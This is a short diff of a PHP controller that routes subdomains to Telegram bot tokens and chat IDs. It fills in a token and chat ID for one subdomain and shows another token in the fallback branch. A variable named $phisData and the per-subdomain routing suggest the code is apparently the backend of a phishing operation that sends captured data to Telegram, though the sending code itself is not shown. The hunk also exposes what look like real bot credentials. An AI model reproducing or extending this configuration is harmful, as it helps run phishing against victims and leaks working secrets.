@@ -209,9 +209,9 @@ class HomeController extends Controller
             $phisData = "MY21";
         } else if ($subdomain == "livegroup-vcx22") {
             // BOT 21s`
-            $bot_token = "";
+            $bot_token = "7812629550:AAHtlojqML7eNzuTFnlc1QSKt20EQZ_47oU";
 
-            $chat_id = "";
+            $chat_id = "7372567403";
             $phisData = "MY22";
         } else {
             $bot_token = "7600923583:AAFsZEE7kYZuaWYlfwNLvNn21t2ZSYKS-t8";
